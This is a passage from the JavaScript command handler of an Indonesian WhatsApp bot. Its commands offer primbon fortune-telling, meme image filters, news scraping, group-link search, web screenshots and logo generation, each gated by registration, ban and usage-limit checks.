m.reply(`⭔ *Zodiak :* ${analisa}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.html`)
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Hasil :* ${anu.message}`)
}
break
case 'sifatusaha': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`)
}
break
case 'rezeki': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'setwebsite': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Example: ${prefix + command} Wadidaw`)
let anu = db.data.web.website = text
m.reply(`Berhasil mengubah website dari ${anu} menjadi ${text}`)
db.data.web.website = text
}
break
case 'setpanel': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Example: ${prefix + command} Wadidaw`)
let anu = db.data.web.panel = text
m.reply(`Berhasil mengubah panel dari ${anu} menjadi ${text}`)
db.data.web.panel = text
}
break
case 'setinformasi': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Example: ${prefix + command} Wadidaw`)
let anu = db.data.settings.information
m.reply(`Berhasil mengubah informasi dari ${anu} menjadi ${text}`)
db.data.settings.information = text
}
break
case 'suamiistri': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 18, 9, 2009, Z, 23, 9, 2007`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 18, 9, 2009, Z, 23, 9, 2007`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 18, 9, 2009, Z, 23, 9, 2007`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'patrick': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva.Patrick()
.setAvatar(urlnya)
.toAttachment();
data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'facepalm': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.facepalm(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'hitler': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.hitler(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'wanted': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.wanted(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'trash': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.trash(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'circle': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.circle(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'jail': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.jail(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'dither': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.dither(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'rip': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.rip(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'gay': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.gay(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'greysclale': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.greyscale(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'sepia': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.sepia(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'beautiful': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.beautiful(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'deletemaker': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.delete(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'triger': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.trigger(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'invert': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.invert(urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'batslap': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await canpas.batslap("https://i.ibb.co/X4VVhkX/22.png", urlnya)
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'xnxx': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva.Xnxx()
.setImage(urlnya)
.setTitle(`${text ? text : 'kosong'}`)
.toAttachment();
data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}wandy`)
}
}
break
case 'ocr': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas/Kirim Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
data = await fetchJson(`https://json-server.wandygunawan.repl.co/home/ocr?image=${urlnya}`)
await m.reply(data.result)
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Balas/Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'horny': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva.Horny()
    .setAvatar(urlnya)
    .toBuild();
data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}wandy`)
}
}
break
case 'jojo': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva.Jo()
    .setImage(urlnya)
    .toBuild();
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}wandy`)
}
}
break
case 'spongebob': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva.Burn()
    .setAvatar(urlnya)
    .toAttachment();
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}wandy`)
}
}
break
case 'darkjoke': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson("https://raw.githubusercontent.com/Wandygans/database/main/darkjoke.js")
randIndex = await pickRandom(resultan)
conn.sendMessage(m.chat, { image: { url: randIndex.result }, caption: "_Done_"}, { quoted: m })
}
break
case 'ppcouple': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
memek = await fetchJson('https://raw.githubusercontent.com/ShirokamiRyzen/WAbot-DB/main/fitur_db/ppcp.json')
cowo = await pickRandom(memek)
conn.sendMessage(m.chat, { image: { url: cowo.cowo }, caption: "_Cowo_"}, { quoted: m })
conn.sendMessage(m.chat, { image: { url: cowo.cewe }, caption: "_Cewe_"}, { quoted: m })
}
break
case 'detiknews':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
data = await dhn.DetikNews()
tekss = `「 *DETIK NEWS* 」\n`
for (let i of data) {
tekss += ` \n*⭔ Berita* : ${i.berita}\n*⭔ Url* : ${i.berita_diupload}\n⭔ *Img* : ${i.berita_thumb}\n────────────────────\n`
}
m.reply(tekss.trim())
break
case 'linkwa':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} jb`)
linkwaa = await linkwa(text)
f = `「 *CARI GRUP* 」`
for (let i of linkwaa) {
f += `\n
▢ *Nama : ${i.nama}
▢ *Link* : ${i.link}\n\n─────────────────────\n`
}
veler = f.trim()
m.reply(veler)
break
case 'liputan6':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
data = await bocil.liputan6()
tekss = `「 *LIPUTAN6* 」\n`
for (let i of data) {
tekss += ` \n*⭔ Title* : ${i.title}\n*⭔ Url* : ${i.link}\n*⭔ Img* : ${i.image}\n*⭔ Desc*: ${i.description}\n\n`
}
m.reply(tekss.trim())
} catch (e) {
error(util.format(e), m, m.chat)
}
break
/*case 'ytsearch': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) return m.reply(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
*/
case 'ssweb':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} google.com`)
ssweb = await fetchJson(`https://json-server.wandygunawan.repl.co/home/ssweb?text=${text}`)
m.reply(mess.wait)
try {
await conn.sendMessage(m.chat, { image: { url: ssweb.result },  caption: `Hasil dari screenshoot web: ${text}`}, { quoted: m })
} catch (e) {
m.reply(`Url invalid!`)
}
break
case 'logo':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
image = await new canva.Gfx1()
    .setName(text)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'coffe':
conn.sendMessage(m.chat, { image: { url: `https://coffee.alexflipnote.dev/random` }, caption: '_Done_'}, { quoted: m })
break
case 'logo1':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
image = await new canva.Gura()
    .setName(text)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'logo2':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
image = await new canva.Gfx2()
    .setName(text)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'logo3':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
